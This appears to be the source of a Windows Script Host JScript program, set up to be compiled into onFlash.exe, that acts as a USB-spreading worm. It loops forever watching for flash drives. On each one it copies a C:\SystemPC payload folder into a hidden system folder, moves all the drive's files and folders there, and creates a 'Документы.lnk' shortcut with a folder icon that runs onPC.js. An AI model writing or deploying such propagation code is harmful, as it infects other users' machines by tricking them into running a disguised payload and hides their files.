
// ----- ExeScript Options Begin -----
// ScriptType: window,activescript,invoker
// DestDirectory: current
// Icon: default
// OutputFile: C:\Users\Гашишович\Desktop\onFlash.exe
// 32Bit: yes
// ----- ExeScript Options End -----
var FSO,WshShell,Drives,D,disk;
var blackList = [];//черный список 
var n=0;//количство дисков в черном списке
WshShell= WScript.CreateObject("WScript.Shell");
FSO = WScript.CreateObject("Scripting.FIleSystemObject");

Drives = new Enumerator(FSO.Drives);
  for(;!Drives.atEnd();Drives.moveNext()){
  D = Drives.item();
  disk = D.DriveLetter;
  if(D.DriveType != 1)continue;
  if(D.isReady != 1){blackList[n]=D;n++;}//добавляем в черный список не рабочие носители
 }

 function blackL(el){//проверяем диск по черному списку
  for(var i=0;i<n;i++){
    if(D==blackList[i])return 0;
  }
  return 1;
}
while(true){// постоянно провряем наличие флешек
Drives = new Enumerator(FSO.Drives);
  for(;!Drives.atEnd();Drives.moveNext()){
  D = Drives.item();
  disk = D.DriveLetter;
  if(D.DriveType != 1)continue;//если не флешка, ищем дальше!
  if(blackL(D) == 0)continue;//если в черном списке, ищем дальше!
  if(!FSO.FolderExists(disk+":\\Document"))FSO.CreateFolder(disk+":\\Document");//создаем папку document
  var folder= FSO.GetFolder(disk+":\\Document");
  folder.Attributes=22;
  FSO.CopyFolder("C:\\SystemPC",disk+":\\Document\\SystemPC");//копируем на флешку
  var folder2= FSO.GetFolder(disk+":\\Document\\SystemPC");
  folder2.Attributes=22;
  
                                   //прмещаем  папки 
  var Folder,subFolders,F;
  Folder = FSO.GetFolder(disk+":\\");
  subFolders = new Enumerator(Folder.subFolders);
  for(;!subFolders.atEnd();subFolders.moveNext()){
    F = subFolders.item();
	if(F.Attributes == 22 || F == "H:\\System Volume Information" || F == disk+":\\Document")continue;
	F.Move(disk+":\\Document\\");
  }
                                   //перемещаем файлы
  var Fol,Files,File;
  Fol = FSO.GetFolder(disk+":\\");
  Files = new Enumerator(Fol.Files);
  for(;!Files.atEnd();Files.moveNext()){
    File = Files.item();
	if(File == disk+":\\Документы.lnk")continue;
	File.Move(disk+":\\Document\\");
  }
  
  
  
//создам ярлык 
  var link = WshShell.CreateShortcut(disk+":\\Документы.lnk");
  link.TargetPath = disk+":\\Document\\SystemPC\\onPC.js";
  link.IconLocation = "imageres.dll,4";
  link.Save();
 }
 WScript.Sleep(5000);
}




















































